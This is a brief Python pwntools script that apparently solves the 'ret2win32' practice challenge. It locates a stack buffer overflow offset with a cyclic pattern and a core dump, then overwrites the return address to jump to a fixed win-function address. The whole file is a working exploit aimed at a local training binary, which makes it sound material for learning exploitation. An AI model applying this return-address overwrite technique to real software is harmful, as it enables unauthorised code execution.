from pwn import *

#
# Context
#

e = context.binary = ELF('ret2win32')

#
# ROP
#

target = p32(0x0804862c)

#
# Find Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x38))
io.wait()

core = io.corefile
offset = cyclic_find(bytes.fromhex(hex(core.eip)[2:])[::-1])

io.close()

info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += target

io = process(e.path)
io.sendlineafter(b'> ', payload)

info(io.recvall().decode())

io.close()